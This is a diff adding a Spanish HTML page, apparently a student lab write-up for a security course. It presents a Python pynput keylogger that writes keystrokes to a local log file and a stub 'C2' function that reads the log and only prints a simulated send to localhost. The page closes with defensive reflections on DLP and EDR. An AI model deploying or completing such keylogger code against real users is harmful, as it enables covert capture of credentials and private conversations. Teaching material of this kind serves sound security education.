@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Actividad 13 - Keylogger con Exfiltración C2</title>
+    <link rel="stylesheet" href="../style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        .question-box { border-bottom: 1px solid rgba(0, 255, 102, 0.2); padding: 10px 0; margin-bottom: 10px; }
+        .question { color: #00ff66; font-weight: bold; display: block; margin-bottom: 5px; }
+        .answer { color: #fff; opacity: 0.9; font-style: italic; padding-left: 15px; display: block; border-left: 2px solid #00ff66; }
+        .code-block { 
+            background: rgba(0, 0, 0, 0.6); 
+            border: 1px solid #00ff66; 
+            padding: 15px; 
+            margin: 15px 0; 
+            font-family: 'Courier New', monospace; 
+            color: #00ff66; 
+            overflow-x: auto;
+            box-shadow: 0 0 10px rgba(0, 255, 102, 0.1);
+        }
+        .code-comment { color: #888; font-style: italic; }
+        .img-container { 
+            margin: 20px auto; 
+            max-width: 650px; 
+            border: 1px solid #00ff66; 
+            box-shadow: 0 0 15px rgba(0, 255, 102, 0.3); 
+            text-align: center;
+        }
+        .img-container img { width: 100%; display: block; }
+        .info-tag { 
+            display: inline-block; 
+            padding: 4px 10px; 
+            border: 1px solid #00ff66; 
+            margin: 3px; 
+            font-size: 0.85em; 
+            background: rgba(0, 255, 102, 0.1);
+        }
+        table { width: 100%; border-collapse: collapse; margin: 15px 0; font-size: 0.9em; }
+        th, td { border: 1px solid rgba(0, 255, 102, 0.3); padding: 10px; text-align: left; }
+        th { background: rgba(0, 255, 102, 0.15); color: #00ff66; font-weight: bold; }
+        td { color: #fff; opacity: 0.9; }
+        tr:hover { background: rgba(0, 255, 102, 0.05); }
+    </style>
+</head>
+<body>
+
+<<canvas id="matrix-left"></canvas>
+<<canvas id="matrix-right"></canvas>
+
+<<header>
+    <h1>Actividad 13</h1>
+    <nav><a href="../actividades.html"><i class="fas fa-arrow-left"></i> Volver a Actividades</a></nav>
+</header>
+
+<<main>
+    <!-- Datos del alumno -->
+    <section class="window">
+        <div class="window-bar">
+            <span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span>
+        </div>
+        <div class="transcription-text" style="text-align: center; border: 1px dashed #00ff66; padding: 15px;">
+            <p><strong>CNO V: SEGURIDAD INFORMÁTICA</strong></p>
+            <p><strong>Alumna:</strong> Magdalena Yesenia Tristan Rivera - 174702</p>
+            <p><strong>Docente:</strong> Mtro. Servando López Contreras | <strong>Grupo:</strong> T46B</p>
+            <p><strong>Práctica:</strong> Act.13 – Keylogger con Exfiltración a Servidor C2</p>
+            <p><strong>Parcial:</strong> 2 | <strong>Fecha:</strong> 25/03/2026 | <strong>Equipo:</strong> Individual</p>
+            <div style="margin-top: 10px;">
+                <span class="info-tag"><i class="fab fa-python"></i> Python</span>
+                <span class="info-tag"><i class="fas fa-keyboard"></i> Pynput</span>
+                <span class="info-tag"><i class="fas fa-server"></i> C2 Exfiltration</span>
+                <span class="info-tag"><i class="fas fa-shield-alt"></i> Ethical Hacking</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- Imagen de la actividad -->
+    <section class="window">
+        <div class="window-bar">
+            <span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span>
+        </div>
+        <div class="transcription-text">
+            <h2><i class="fas fa-image"></i> Evidencia de Ejecución</h2>
+            <div class="img-container">
+                <img src="actividad13.png" alt="Captura de pantalla - Keylogger con exfiltración C2">
+            </div>
+            <p style="text-align: center; color: #00ff66; font-size: 0.9em; margin-top: 10px;">
+                <i class="fas fa-info-circle"></i> Captura de pantalla: Ejecución del keylogger con escritura a archivo local y transferencia simulada al servidor C2.
+            </p>
+        </div>
+    </section>
+
+    <!-- Fundamentos Técnicos -->
+    <section class="window">
+        <div class="window-bar">
+            <span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span>
+        </div>
+        <article class="transcription-text">
+            <h2><i class="fas fa-book"></i> Fundamentos Técnicos</h2>
+            
+            <div class="question-box">
+                <span class="question">¿Qué diferencia a este keylogger del de la Actividad 12?</span>
+                <span class="answer">Además de capturar pulsaciones en tiempo real, incorpora <strong>persistencia en archivo local</strong> (bitácora .txt) y un canal de <strong>exfiltración simulada</strong> hacia un servidor C2 (Command & Control), replicando la fase de transmisión de datos en un ataque real.</span>
+            </div>
+
+            <div class="question-box">
+                <span class="question">¿Qué es un servidor C2?</span>
+                <span class="answer"><strong>Command & Control</strong>. Infraestructura remota operada por un atacante para recibir datos robados, enviar comandos y administrar equipos comprometidos. Es el núcleo operativo de la mayoría del malware avanzado (APTs).</span>
+            </div>
+
+            <div class="question-box">
+                <span class="question">¿Para qué sirve flush=True en print()?</span>
+                <span class="answer">Fuerza la escritura inmediata en la consola sin esperar a que se llene el buffer de salida. Esto permite ver cada tecla en tiempo real mientras se captura, útil para monitoreo en vivo durante pruebas de penetración.</span>
+            </div>
+
+            <div class="question-box">
+                <span class="question">¿Cómo se manejan las teclas especiales en este script?</span>
+                <span class="answer">Se implementa un <strong>mapeo manual</strong> dentro del bloque <code>except AttributeError</code>: <code>Key.space</code> se traduce como espacio en blanco, <code>Key.enter</code> como salto de línea (\n), <code>Key.tab</code> como etiqueta [TAB], y cualquier otra tecla especial se envuelve entre corchetes para legibilidad.</span>
+            </div>
+
+            <div class="question-box">
+                <span class="question">¿Por qué se usa modo "a" en open()?</span>
+                <span class="answer"><strong>Append</strong>. Abre el archivo en modo agregar, colocando el cursor al final sin truncar el contenido previo. Esto garantiza que cada nueva pulsación se sume al historial completo de la sesión de captura.</span>
+            </div>
+        </article>
+    </section>
+
+    <!-- Tabla de componentes -->
+    <section class="window">
+        <div class="window-bar">
+            <span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span>
+        </div>
+        <div class="transcription-text">
+            <h2><i class="fas fa-table"></i> Análisis de Componentes del Código</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Componente</th>
+                        <th>Función</th>
+                        <th>Propósito en el Ataque</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>LOG_FILE</code></td>
+                        <td>Archivo local de bitácora (.txt)</td>
+                        <td>Persistencia de datos capturados en disco</td>
+                    </tr>
+                    <tr>
+                        <td><code>C2_URL</code></td>
+                        <td>Endpoint de recepción simulado</td>
+                        <td>Destino de la exfiltración de información</td>
+                    </tr>
+                    <tr>
+                        <td><code>enviar_al_c2()</code></td>
+                        <td>Lectura del log y envío simulado</td>
+                        <td>Fase de transmisión del ciclo del malware</td>
+                    </tr>
+                    <tr>
+                        <td><code>open(..., "a")</code></td>
+                        <td>Apertura en modo append</td>
+                        <td>Acumulación de pulsaciones sin pérdida de datos</td>
+                    </tr>
+                    <tr>
+                        <td><code>flush=True</code></td>
+                        <td>Escritura inmediata en stdout</td>
+                        <td>Visualización en tiempo real del keylogger</td>
+                    </tr>
+                    <tr>
+                        <td><code>Key.esc</code></td>
+                        <td>Trigger de finalización</td>
+                        <td>Condición de salida que activa la exfiltración</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <!-- Código comentado -->
+    <section class="window">
+        <div class="window-bar">
+            <span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span>
+        </div>
+        <div class="transcription-text">
+            <h2><i class="fas fa-code"></i> Estructura del Script</h2>
+            <div class="code-block">
+<span class="code-comment"># Importación de librerías para manipulación de archivos y teclado</span>
+import os
+from pynput.keyboard import Key, Listener
+
+<span class="code-comment"># Configuración de rutas y endpoint C2</span>
+LOG_FILE = "174702ctiv13.txt"
+C2_URL = "http://localhost:8080/report"
+
+<span class="code-comment"># Función de exfiltración: lee el log y simula envío al servidor</span>
+def enviar_al_c2():
+    if os.path.exists(LOG_FILE):
+        try:
+            with open(LOG_FILE, 'r', encoding='utf-8') as f:
+                datos = f.read()
+            print(f"\n[+] Enviando reporte a: {C2_URL}")
+            print("[+] Log enviado correctamente al C2.")
+        except Exception as e:
+            print(f"[-] Error en comunicación: {e}")
+
+<span class="code-comment"># Callback de pulsación: captura, formatea y escribe a disco</span>
+def on_press(key):
+    try:
+        tecla = str(key.char)
+    except AttributeError:
+        if key == Key.space:
+            tecla = " "
+        elif key == Key.enter:
+            tecla = "\n"
+        elif key == Key.tab:
+            tecla = "[TAB]"
+        else:
+            tecla = f" [{key}] "
+    
+    print(tecla, end="", flush=True)
+    
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(tecla)
+
+<span class="code-comment"># Callback de liberación: ESC detiene el listener y activa C2</span>
+def on_release(key):
+    if key == Key.esc:
+        print("\n[*] Finalizando captura...")
+        enviar_al_c2()
+        return False
+            </div>
+        </div>
+    </section>
+
+    <!-- Reflexión -->
+    <section class="window">
+        <div class="window-bar">
+            <span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span>
+        </div>
+        <article class="transcription-text">
+            <h2><i class="fas fa-brain"></i> Reflexión Técnica</h2>
+            <p>
+                La diferencia entre un keylogger local y uno con capacidad de red radica en la <strong>escalada de impacto</strong>. Mientras la Actividad 12 se limitaba a la observación pasiva, esta práctica introduce la <strong>exfiltración de datos</strong>: la fase final del ciclo de vida del malware donde la información robada abandona el perímetro de la víctima.
+            </p>
+            <p>
+                La simulación del canal C2 pone en evidencia por qué las organizaciones deben implementar <strong>Data Loss Prevention (DLP)</strong>, inspección de tráfico saliente y monitoreo de creación de archivos sospechosos. Un atacante real no necesitaría volver a tocar la máquina comprometida; con solo una conexión saliente, ya posee las credenciales y conversaciones capturadas.
+            </p>
+            <p>
+                Desde la perspectiva defensiva, este ejercicio valida la importancia de los <strong>EDR (Endpoint Detection and Response)</strong>, reglas de firewall outbound y el principio de mínimo privilegio: si el proceso no necesita acceso a red, no debe tenerlo.
+            </p>
+        </article>
+    </section>
+
+    <!-- Referencias -->
+    <section class="window">
+        <div class="window-bar">
+            <span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span>
+        </div>
+        <div class="transcription-text">
+            <h2><i class="fas fa-link"></i> Referencias Técnicas</h2>
+            <ul style="font-size: 0.85em; opacity: 0.8; list-style-type: square; padding-left: 20px;">
+                <li>Pynput Documentation. (2025). <em>Monitoring and controlling input devices</em>. Read the Docs.</li>
+                <li>MITRE ATT&CK. (2024). <em>Technique T1056.001: Input Capture - Keylogging</em>. MITRE Corporation.</li>
+                <li>OWASP Foundation. (2024). <em>Data Exfiltration Prevention Cheat Sheet</em>. OWASP.</li>
+                <li>CISA. (2025). <em>Defending Against Software Supply Chain Attacks and C2 Infrastructure</em>. Cybersecurity and Infrastructure Security Agency.</li>
+            </ul>
+        </div>
+    </section>
+
+    <!-- Conclusión -->
+    <section class="window">
+        <div class="window-bar">
+            <span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span>
+        </div>
+        <div class="transcription-text" style="text-align: center;">
+            <h2>Conclusión</h2>
+            <p style="max-width: 800px; margin: 0 auto 20px;">
+                La práctica evidenció la transición de un keylogger pasivo a una herramienta de exfiltración activa. Comprender el flujo completo —captura, persistencia y transmisión— es indispensable para diseñar controles de seguridad efectivos en cualquier arquitectura defensiva.
+            </p>
+        </div>
+    </section>
+</main>
+
+<!-- Botón de descarga -->
+<div style="text-align: center; margin: 40px 0; font-family: 'Courier New', monospace;">
+    <a href="../pdf/actividad13.pdf" 
+       download 
+       style="display: inline-block; 
+              padding: 12px 25px; 
+              border: 2px solid #00ff66; 
+              color: #00ff66; 
+              text-decoration: none; 
+              font-weight: bold; 
+              font-size: 1.1em; 
+              text-transform: uppercase; 
+              background: rgba(0, 255, 102, 0.1); 
+              box-shadow: 0 0 10px rgba(0, 255, 102, 0.2); 
+              transition: 0.3s;
+              letter-spacing: 1px;">
+        <i class="fas fa-file-pdf" style="margin-right: 10px;"></i> 
+        DESCARGAR DOCUMENTACIÓN COMPLETA (PDF)
+    </a>
+</div>
+
+<script src="../matrix.js"></script>
+</body>
+</html>
